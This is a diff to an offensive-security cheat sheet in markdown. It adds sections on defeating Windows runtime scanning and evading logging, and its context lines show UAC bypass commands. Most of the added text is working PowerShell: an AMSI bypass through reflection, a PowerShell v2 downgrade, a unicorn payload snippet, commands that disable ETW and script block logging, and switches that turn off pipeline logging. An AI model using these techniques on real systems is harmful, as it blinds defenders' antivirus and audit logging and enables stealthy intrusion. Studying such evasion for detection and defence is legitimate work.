@@ -17,6 +17,8 @@
   - [GUI bypass](#gui-bypass)
   - [Auto Elevating](#auto-elevating)
   - [Enviroment Variable](#enviroment-variable)
+- [Runtime Detection](#runtime-detection)
+- [Evade Loggin](#evade-loggin)
 - [Bypass Applocker](#bypass-applocker)
 
 # Internal
@@ -403,7 +405,6 @@
 
 [**Automated bypass**](https://github.com/hfiref0x/UACME)
 
-
 ## GUI bypass
 - **msconfig** RUNS with IL high
     - shell from msconfing = high
@@ -488,8 +489,101 @@ schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
 reg delete "HKCU\Environment" /v "windir" /f
 ```
 
+# Runtime Detection
+- Scan code before execution
+  - directly from memory
+- CRL = Common Language Runtime
+- DLR = Dynamic Language Runtime
+- [Amsi Fail](http://amsi.fail/)
 
-  - 
+- How
+  - Donwgrade powershell
+  - Powershell -Version 2
+  
+```
+https://github.com/trustedsec/unicorn
+
+full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
+```
+
+- **Reflection**
+```
+# Reflection to modify and bypass AMSI
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# 1 - use assembly from Ref.Assembly
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+
+# 2 - obtain .net assembly for PSEtwLogProvider, piped from the previous part of the command
+.GetField('amsiInitFailed','NonPublic,Static')
+
+# 3 - set field m_enabled do previous stored value
+.SetValue($null,$true)
+```
+
+# Evade Loggin
+
+- Methodology
+  - disable logging (1)
+  - keep integrity (2)
+  - clear logs (3)
+
+- Logs are forwarded from endpoints to central device
+- just deleting them may raise alerts
+- Append to a .ps1 script
+
+- **Check amount registered log entries - (2)**
+```
+Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
+
+# Check Event Viewer
+Microsoft/Windows/PowerShell/Operational 
+```
+
+- **Reflection - (1)**
+```
+# obtain .net assembly for PSEtwLogProvider
+$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+
+# store null value for etwProvider
+$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)
+
+# set field m_enabled do previous sotred value
+[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);
+```
+
+
+- **Group Policy Takeover**
+```
+# Reflection to obtaim SM and identify GPO
+$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
+
+# modify event provider to 4104 to 0  
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
+
+# 4103
+$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
+```
+
+- **Disable Logging in ps session**
+  - Append to script OR execute in session
+  - Avoid sending logs to the pipeline
+
+```
+# Get target module
+$module = Get-Module Microsoft.PowerShell.Utility 
+
+# module execution details = false
+$module.LogPipelineExecutionDetails = $false
+
+# Get target ps-snapin
+$snap = Get-PSSnapin Microsoft.PowerShell.Core
+
+# Set ps-snapin execution details to false
+$snap.LogPipelineExecutionDetails = $false
+```
+
 
 
 # Bypass Applocker
